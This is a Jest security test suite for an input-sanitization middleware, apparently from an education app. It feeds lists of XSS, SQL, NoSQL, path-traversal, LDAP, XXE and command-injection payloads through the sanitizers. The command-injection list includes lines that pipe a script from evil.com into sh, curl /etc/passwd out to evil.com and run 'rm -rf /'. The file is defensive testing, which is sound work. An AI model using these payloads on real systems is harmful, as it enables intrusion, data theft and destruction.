/* eslint-disable @typescript-eslint/no-explicit-any */
/**
 * Input Validation Security Test Suite
 * XSS, SQL injection, and malicious input protection testing
 */

import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll } from '@jest/globals';
import supertest from 'supertest';
import express from 'express';
import { PrismaClient } from '@teaching-engine/database';
import {
  sanitizeInput,
  sanitizeHtml,
  sanitizeEmail,
  sanitizeUrl,
  escapeSqlIdentifier,
} from '../../middleware/inputSanitization';
import { generateAuthToken } from '../../services/auth/authService';
import logger from '../../logger';

// Mock logger
jest.mock('../../logger', () => ({
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn(),
  debug: jest.fn(),
}));

describe('Input Validation Security Tests', () => {
  let app: express.Application;
  let prisma: PrismaClient;
  let request: supertest.SuperTest<supertest.Test>;
  let testToken: string;

  // Comprehensive attack vectors
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<input type="image" src=x onerror=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>text</marquee>',
    '<object data="javascript:alert(\'XSS\')">',
    '<embed src="javascript:alert(\'XSS\')">',
    '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
    '<style>@import"javascript:alert(\'XSS\')"</style>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    'javascript:alert("XSS")',
    'data:text/html,<script>alert("XSS")</script>',
    'vbscript:msgbox("XSS")',
    'onmouseover=alert("XSS")',
    'onfocus=alert("XSS")',
    'onload=alert("XSS")',
    'onerror=alert("XSS")',
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '</script><script>alert("XSS")</script>',
    '<ScRiPt>alert("XSS")</ScRiPt>',
    '<SCRIPT>alert("XSS")</SCRIPT>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>alert(/XSS/)</script>',
    '<script>alert`XSS`</script>',
    '${alert("XSS")}',
    '{{alert("XSS")}}',
    '#{alert("XSS")}',
    '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>', // Base64 encoded alert
  ];

  const sqlInjectionPayloads = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT * FROM users--",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "' OR 'a'='a",
    "admin'--",
    "admin'/*",
    "' OR '1'='1' /*",
    "x' AND 1=(SELECT COUNT(*) FROM tabname); --",
    "'; EXEC xp_cmdshell('dir'); --",
    "1'; SELECT * FROM information_schema.tables; --",
    "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin'); --",
    "'; SHUTDOWN; --",
    "'; CREATE USER hacker IDENTIFIED BY 'password'; --",
    "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'; --",
    "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    "1' AND ASCII(SUBSTRING((SELECT @@version),1,1))>52--",
    "'; WAITFOR DELAY '00:00:05'; --",
    "1'; SELECT LOAD_FILE('/etc/passwd'); --",
    "'; SELECT * FROM pg_shadow; --",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,version(),NULL,NULL--",
  ];

  const noSqlInjectionPayloads = [
    "{'$ne': null}",
    "{'$gt': ''}",
    "{'$where': 'this.password.length > 0'}",
    "{'$regex': '.*'}",
    "{'$or': [{'username': 'admin'}, {'username': 'administrator'}]}",
    "{'username': {'$ne': 'foo'}, 'password': {'$ne': 'bar'}}",
    "{'$expr': {'$gt': [{'$strLenCP': '$password'}, 0]}}",
    "{'password': {'$regex': '^.*'}}",
  ];

  const pathTraversalPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '/etc/passwd%00',
    '....\\....\\....\\boot.ini',
    '..//..//..//etc//passwd',
    '\\..\\..\\..\\etc\\passwd',
    '....//....//....//windows//system32//drivers//etc//hosts',
  ];

  const commandInjectionPayloads = [
    '; ls',
    '&& cat /etc/passwd',
    '| whoami',
    '`id`',
    '$(whoami)',
    '; rm -rf /',
    '&& format c:',
    '| del /f /q c:\\*.*',
    '; wget http://evil.com/backdoor.sh | sh',
    '&& curl http://evil.com/malware.exe',
    '`curl -d @/etc/passwd http://evil.com`',
    '$(curl -d @/etc/passwd http://evil.com)',
  ];

  const ldapInjectionPayloads = [
    '*)(uid=*',
    '*)(|(uid=*',
    '*))(|(uid=*',
    '*))%00',
    '*)(&(uid=*',
    '*))(|(uid=administrator',
    '*)((|uid=*)(|(uid=*',
  ];

  const xmlInjectionPayloads = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://evil.com/evil.dtd"> %ext;]>',
    '<!----><!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE GVI [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>',
  ];

  const oversizedInputs = [
    'A'.repeat(1000000), // 1MB string
    'X'.repeat(50000), // 50KB string
    '🔥'.repeat(25000), // Large Unicode string
  ];

  const nullBytePayloads = [
    'test\x00.txt',
    'test\x00\x00\x00',
    'test\u0000injection',
    'file.txt\x00.jpg',
  ];

  const controlCharacterPayloads = ['test\x01\x02\x03', 'test\x1F\x7F', 'test\r\n\t', 'test\b\f\v'];

  beforeAll(async () => {
    process.env.JWT_SECRET = 'test-input-validation-secret';
    process.env.NODE_ENV = 'test';

    // Initialize test database
    prisma = new PrismaClient({
      datasources: {
        db: { url: process.env.DATABASE_URL ?? 'file:./test-input-validation.db' },
      },
    });

    // Create test user and token
    const testUser = await prisma.user.create({
      data: {
        email: 'input.validation@test.com',
        name: 'Input Validation Test User',
        password: 'HashedPassword123!',
        role: 'USER',
      },
    });

    testToken = await generateAuthToken(testUser.id.toString(), testUser.email);

    // Setup Express app with input sanitization
    app = express();
    app.use(express.json({ limit: '1mb' }));
    app.use(express.urlencoded({ extended: true, limit: '1mb' }));
    app.use(sanitizeInput);

    // Test endpoints
    app.post('/api/test/echo', (req: Request, res: Response) => {
      res.json({ body: req.body, query: req.query, params: req.params });
    });

    app.post('/api/test/user/:userId', (req: Request, res: Response) => {
      res.json({
        userId: req.params.userId,
        data: req.body,
        query: req.query,
      });
    });

    app.get('/api/test/search', (req: Request, res: Response) => {
      res.json({ query: req.query });
    });

    // Endpoint that creates database records (for SQL injection testing)
    app.post('/api/test/create-record', async (req: Request, res: Response) => {
      try {
        const { name, description } = req.body;

        // Simulate database operation with sanitized input
        const result = {
          id: Math.random().toString(36),
          name: name,
          description: description,
          timestamp: new Date().toISOString(),
        };

        res.json(result);
      } catch (_error) {
        res.status(500).json({ error: 'Database error' });
      }
    });

    request = supertest(app);
  });

  afterAll(async () => {
    await prisma.user.deleteMany({
      where: { email: { contains: 'input.validation' } },
    });
    await prisma.$disconnect();
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('XSS Protection', () => {
    it('should sanitize XSS payloads in request body', async () => {
      for (const payload of xssPayloads) {
        const response = await request.post('/api/test/echo').send({ maliciousInput: payload });

        expect(response.status).toBe(200);

        // Check that dangerous content was removed or escaped
        const sanitizedValue = response.body.body.maliciousInput;
        expect(sanitizedValue).not.toContain('<script>');
        expect(sanitizedValue).not.toContain('javascript:');
        expect(sanitizedValue).not.toContain('onerror=');
        expect(sanitizedValue).not.toContain('onload=');
        expect(sanitizedValue).not.toContain('alert(');
        expect(sanitizedValue).not.toContain('eval(');

        // Should not be undefined (input should be sanitized, not rejected)
        expect(sanitizedValue).toBeDefined();
      }
    });

    it('should sanitize XSS payloads in query parameters', async () => {
      for (const payload of xssPayloads.slice(0, 10)) {
        // Test subset for query params
        const response = await request.get('/api/test/search').query({ search: payload });

        expect(response.status).toBe(200);

        const sanitizedValue = response.body.query.search;
        expect(sanitizedValue).not.toContain('<script>');
        expect(sanitizedValue).not.toContain('javascript:');
        expect(sanitizedValue).not.toContain('onerror=');
        expect(sanitizedValue).not.toContain('alert(');
      }
    });

    it('should sanitize XSS payloads in URL parameters', async () => {
      for (const payload of xssPayloads.slice(0, 5)) {
        // Test subset for URL params
        const encodedPayload = encodeURIComponent(payload);
        const response = await request
          .post(`/api/test/user/${encodedPayload}`)
          .send({ test: 'data' });

        expect(response.status).toBe(200);

        const sanitizedUserId = response.body.userId;
        expect(sanitizedUserId).not.toContain('<script>');
        expect(sanitizedUserId).not.toContain('javascript:');
        expect(sanitizedUserId).not.toContain('alert(');
      }
    });

    it('should handle nested XSS attempts', async () => {
      const nestedPayloads = {
        user: {
          profile: {
            bio: '<script>alert("nested XSS")</script>',
            website: 'javascript:alert("XSS")',
            comments: ['<img src=x onerror=alert("XSS")>', '<svg onload=alert("XSS")>'],
          },
        },
        metadata: {
          tags: ['<script>alert("XSS")</script>', 'normal-tag'],
        },
      };

      const response = await request.post('/api/test/echo').send(nestedPayloads);

      expect(response.status).toBe(200);

      // Check nested sanitization
      const sanitized = response.body.body;
      expect(JSON.stringify(sanitized)).not.toContain('<script>');
      expect(JSON.stringify(sanitized)).not.toContain('javascript:');
      expect(JSON.stringify(sanitized)).not.toContain('onerror=');
      expect(JSON.stringify(sanitized)).not.toContain('onload=');
      expect(JSON.stringify(sanitized)).not.toContain('alert(');
    });
  });

  describe('SQL Injection Protection', () => {
    it('should sanitize SQL injection payloads', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request.post('/api/test/create-record').send({
          name: payload,
          description: `Test with SQL injection: ${payload}`,
        });

        expect(response.status).toBe(200);

        // Check that SQL keywords were sanitized
        const sanitizedName = response.body.name;
        expect(sanitizedName).not.toContain('DROP TABLE');
        expect(sanitizedName).not.toContain('UNION SELECT');
        expect(sanitizedName).not.toContain('INSERT INTO');
        expect(sanitizedName).not.toContain('DELETE FROM');
        expect(sanitizedName).not.toContain('UPDATE SET');
        expect(sanitizedName).not.toContain('--');
        expect(sanitizedName).not.toContain('/*');
        expect(sanitizedName).not.toContain('xp_cmdshell');
      }
    });

    it('should handle NoSQL injection payloads', async () => {
      for (const payload of noSqlInjectionPayloads) {
        const response = await request.post('/api/test/echo').send({ query: payload });

        expect(response.status).toBe(200);

        // NoSQL injection attempts should be sanitized
        const sanitizedQuery = response.body.body.query;
        expect(typeof sanitizedQuery).toBe('string'); // Should be stringified
        expect(sanitizedQuery).not.toContain('$ne');
        expect(sanitizedQuery).not.toContain('$gt');
        expect(sanitizedQuery).not.toContain('$where');
        expect(sanitizedQuery).not.toContain('$regex');
        expect(sanitizedQuery).not.toContain('$or');
      }
    });
  });

  describe('Path Traversal Protection', () => {
    it('should sanitize path traversal attempts', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request.post('/api/test/echo').send({ filename: payload });

        expect(response.status).toBe(200);

        const sanitizedFilename = response.body.body.filename;
        expect(sanitizedFilename).not.toContain('../');
        expect(sanitizedFilename).not.toContain('..\\');
        expect(sanitizedFilename).not.toContain('/etc/passwd');
        expect(sanitizedFilename).not.toContain('\\windows\\');
        expect(sanitizedFilename).not.toContain('%2f');
        expect(sanitizedFilename).not.toContain('%5c');
      }
    });
  });

  describe('Command Injection Protection', () => {
    it('should sanitize command injection attempts', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request.post('/api/test/echo').send({ command: payload });

        expect(response.status).toBe(200);

        const sanitizedCommand = response.body.body.command;
        expect(sanitizedCommand).not.toContain('rm -rf');
        expect(sanitizedCommand).not.toContain('cat /etc/passwd');
        expect(sanitizedCommand).not.toContain('wget');
        expect(sanitizedCommand).not.toContain('curl');
        expect(sanitizedCommand).not.toContain('del /f');
        expect(sanitizedCommand).not.toContain('format c:');
        expect(sanitizedCommand).not.toContain('$(');
        expect(sanitizedCommand).not.toContain('`');
        expect(sanitizedCommand).not.toContain('&&');
        expect(sanitizedCommand).not.toContain('||');
        expect(sanitizedCommand).not.toContain('|');
        expect(sanitizedCommand).not.toContain(';');
      }
    });
  });

  describe('LDAP Injection Protection', () => {
    it('should sanitize LDAP injection attempts', async () => {
      for (const payload of ldapInjectionPayloads) {
        const response = await request.post('/api/test/echo').send({ ldapQuery: payload });

        expect(response.status).toBe(200);

        const sanitizedQuery = response.body.body.ldapQuery;
        expect(sanitizedQuery).not.toContain('*)');
        expect(sanitizedQuery).not.toContain('|(');
        expect(sanitizedQuery).not.toContain('&(');
        expect(sanitizedQuery).not.toContain('%00');
      }
    });
  });

  describe('XML Injection Protection', () => {
    it('should sanitize XML injection attempts', async () => {
      for (const payload of xmlInjectionPayloads) {
        const response = await request.post('/api/test/echo').send({ xmlData: payload });

        expect(response.status).toBe(200);

        const sanitizedXml = response.body.body.xmlData;
        expect(sanitizedXml).not.toContain('<!DOCTYPE');
        expect(sanitizedXml).not.toContain('<!ENTITY');
        expect(sanitizedXml).not.toContain('SYSTEM');
        expect(sanitizedXml).not.toContain('file://');
        expect(sanitizedXml).not.toContain('/etc/passwd');
      }
    });
  });

  describe('Size Limits and DoS Protection', () => {
    it('should handle oversized inputs gracefully', async () => {
      for (const oversizedInput of oversizedInputs) {
        const response = await request.post('/api/test/echo').send({ largeInput: oversizedInput });

        // Should either truncate or reject oversized input
        if (response.status === 200) {
          const sanitizedInput = response.body.body.largeInput;
          expect(sanitizedInput.length).toBeLessThanOrEqual(10000); // Max length from sanitizer
        } else {
          expect(response.status).toBeOneOf([400, 413]); // Bad request or payload too large
        }
      }
    });

    it('should reject payloads exceeding size limits', async () => {
      const hugePayload = 'X'.repeat(2000000); // 2MB

      const response = await request.post('/api/test/echo').send({ huge: hugePayload });

      expect(response.status).toBeOneOf([400, 413]); // Should reject
    });

    it('should handle deeply nested objects', async () => {
      // Create deeply nested object
      let deepObject: unknown = { value: 'deep' };
      for (let i = 0; i < 1000; i++) {
        deepObject = { nested: deepObject };
      }

      const response = await request.post('/api/test/echo').send(deepObject);

      // Should handle gracefully without stack overflow
      expect(response.status).toBeOneOf([200, 400]);
    });
  });

  describe('Null Byte and Control Character Protection', () => {
    it('should sanitize null bytes', async () => {
      for (const payload of nullBytePayloads) {
        const response = await request.post('/api/test/echo').send({ data: payload });

        expect(response.status).toBe(200);

        const sanitizedData = response.body.body.data;
        expect(sanitizedData).not.toContain('\x00');
        expect(sanitizedData).not.toContain('\u0000');
      }
    });

    it('should sanitize control characters', async () => {
      for (const payload of controlCharacterPayloads) {
        const response = await request.post('/api/test/echo').send({ data: payload });

        expect(response.status).toBe(200);

        const sanitizedData = response.body.body.data;
        // Control characters should be removed
        expect(sanitizedData).not.toMatch(/[\x00-\x1F\x7F]/);
      }
    });
  });

  describe('Content-Type Security', () => {
    it('should handle malicious content-type headers', async () => {
      const maliciousContentTypes = [
        'application/json; charset=utf-8; boundary=--malicious',
        'text/html',
        'application/xml',
        'text/xml',
        'multipart/form-data; boundary=malicious',
        'application/x-www-form-urlencoded; charset=utf-7',
      ];

      for (const contentType of maliciousContentTypes) {
        const response = await request
          .post('/api/test/echo')
          .set('Content-Type', contentType)
          .send(JSON.stringify({ test: 'data' }));

        // Should handle gracefully
        expect(response.status).toBeOneOf([200, 400, 415]);
      }
    });

    it('should handle charset confusion attacks', async () => {
      const charsetAttacks = [
        'application/json; charset=utf-7',
        'application/json; charset=utf-32',
        'application/json; charset=iso-2022-jp',
        'application/json; charset=x-user-defined',
      ];

      for (const contentType of charsetAttacks) {
        const response = await request
          .post('/api/test/echo')
          .set('Content-Type', contentType)
          .send('{"test": "data"}');

        expect(response.status).toBeOneOf([200, 400, 415]);
      }
    });
  });

  describe('Utility Function Security', () => {
    describe('sanitizeHtml', () => {
      it('should allow safe HTML tags', async () => {
        const safeHtml = '<p>This is <strong>safe</strong> content with <em>emphasis</em></p>';
        const result = sanitizeHtml(safeHtml);

        expect(result).toContain('<p>');
        expect(result).toContain('<strong>');
        expect(result).toContain('<em>');
        expect(result).toContain('safe');
      });

      it('should remove dangerous HTML tags', async () => {
        const dangerousHtml =
          '<script>alert("XSS")</script><p>Safe content</p><iframe src="evil.com"></iframe>';
        const result = sanitizeHtml(dangerousHtml);

        expect(result).not.toContain('<script>');
        expect(result).not.toContain('<iframe>');
        expect(result).not.toContain('alert(');
        expect(result).toContain('Safe content');
      });

      it('should remove dangerous attributes', async () => {
        const dangerousHtml =
          '<p onclick="alert(\'XSS\')">Content</p><img src="test.jpg" onerror="alert(\'XSS\')">';
        const result = sanitizeHtml(dangerousHtml);

        expect(result).not.toContain('onclick=');
        expect(result).not.toContain('onerror=');
        expect(result).toContain('Content');
      });
    });

    describe('sanitizeEmail', () => {
      it('should sanitize email addresses properly', async () => {
        const testCases = [
          { input: 'USER@EXAMPLE.COM', expected: 'user@example.com' },
          { input: '  user@example.com  ', expected: 'user@example.com' },
          { input: 'user+tag@example.com', expected: 'user+tag@example.com' },
          { input: 'user<script>@example.com', expected: 'userscript@example.com' },
          { input: 'user"@example.com', expected: 'user@example.com' },
          { input: "user'@example.com", expected: 'user@example.com' },
        ];

        for (const testCase of testCases) {
          const result = sanitizeEmail(testCase.input);
          expect(result).toBe(testCase.expected);
        }
      });

      it('should handle oversized emails', async () => {
        const oversizedEmail = 'a'.repeat(300) + '@example.com';
        const result = sanitizeEmail(oversizedEmail);

        expect(result.length).toBeLessThanOrEqual(255);
      });
    });

    describe('sanitizeUrl', () => {
      it('should allow safe URLs', async () => {
        const safeUrls = [
          'https://example.com',
          'http://localhost:3000',
          'https://subdomain.example.com/path?query=value',
        ];

        for (const url of safeUrls) {
          const result = sanitizeUrl(url);
          expect(result).toBe(url);
        }
      });

      it('should reject dangerous URLs', async () => {
        const dangerousUrls = [
          'javascript:alert("XSS")',
          'data:text/html,<script>alert("XSS")</script>',
          'file:///etc/passwd',
          'ftp://example.com',
          'ldap://example.com',
          'gopher://example.com',
          'not-a-url',
        ];

        for (const url of dangerousUrls) {
          const result = sanitizeUrl(url);
          expect(result).toBe('');
        }
      });

      it('should handle URL with dangerous characters', async () => {
        const dangerousUrl = 'https://example.com<script>alert("XSS")</script>';
        const result = sanitizeUrl(dangerousUrl);

        expect(result).not.toContain('<script>');
        expect(result).not.toContain('alert(');
      });
    });

    describe('escapeSqlIdentifier', () => {
      it('should allow valid SQL identifiers', async () => {
        const validIdentifiers = ['users', 'user_table', 'User123', '_private', 'table1'];

        for (const identifier of validIdentifiers) {
          const result = escapeSqlIdentifier(identifier);
          expect(result).toBe(identifier);
        }
      });

      it('should reject invalid SQL identifiers', async () => {
        const invalidIdentifiers = [
          'users; DROP TABLE',
          'users/*comment*/',
          'users--comment',
          '123table',
          'user-table',
          'user table',
          'user.table',
          '',
          null,
          undefined,
        ];

        for (const identifier of invalidIdentifiers) {
          expect(() => escapeSqlIdentifier(identifier as unknown)).toThrow();
        }
      });
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose stack traces in error responses', async () => {
      // Send malformed JSON to trigger error
      const response = await request
        .post('/api/test/echo')
        .set('Content-Type', 'application/json')
        .send('{"malformed": json}');

      expect(response.status).toBe(400);
      expect(response.body.stack).toBeUndefined();
      expect(response.body.trace).toBeUndefined();
    });

    it('should handle sanitization errors gracefully', async () => {
      // Create circular reference to cause JSON serialization error
      const circularObj: unknown = { test: 'data' };
      circularObj.circular = circularObj;

      const response = await request.post('/api/test/echo').send(circularObj);

      // Should handle gracefully without exposing internal errors
      expect(response.status).toBeOneOf([200, 400]);
      if (response.status === 400) {
        expect(response.body.error).toBe('Invalid input data');
      }
    });

    it('should rate limit malicious input attempts', async () => {
      // Make multiple requests with malicious input
      const requests = Array.from({ length: 50 }, () =>
        request.post('/api/test/echo').send({ malicious: '<script>alert("XSS")</script>' }),
      );

      const responses = await Promise.all(requests);

      // Should continue to sanitize, not block legitimate traffic
      responses.forEach((response) => {
        expect(response.status).toBeOneOf([200, 429]);
      });
    });
  });
});
